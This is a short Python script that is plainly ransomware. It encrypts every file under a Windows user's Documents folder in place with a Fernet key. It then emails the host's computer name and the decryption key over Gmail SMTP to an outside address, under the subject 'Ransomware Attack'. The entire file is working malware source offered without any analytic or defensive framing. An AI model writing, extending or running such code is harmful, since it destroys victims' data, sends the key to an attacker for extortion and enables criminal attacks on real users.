import os
import smtplib
from email.message import EmailMessage
from cryptography.fernet import Fernet

# Function to encrypt files
def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()
    
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)
    
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)

# Generate encryption key
key = Fernet.generate_key()

# Encrypt files in the target directory
target_directory = "C:/Users/User/Documents"
for root, _, files in os.walk(target_directory):
    for file in files:
        file_path = os.path.join(root, file)
        encrypt_file(file_path, key)

# Send email with host details and decryption key
msg = EmailMessage()
msg.set_content(f"Host details: {os.environ['COMPUTERNAME']}\nDecryption key: {key.decode()}")

msg['Subject'] = 'Ransomware Attack'
msg['From'] = 'your_email@gmail.com'
msg['To'] = 'martinmwendwa005@gmail.com'

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login('your_email@gmail.com', 'your_password')
server.send_message(msg)
server.quit()
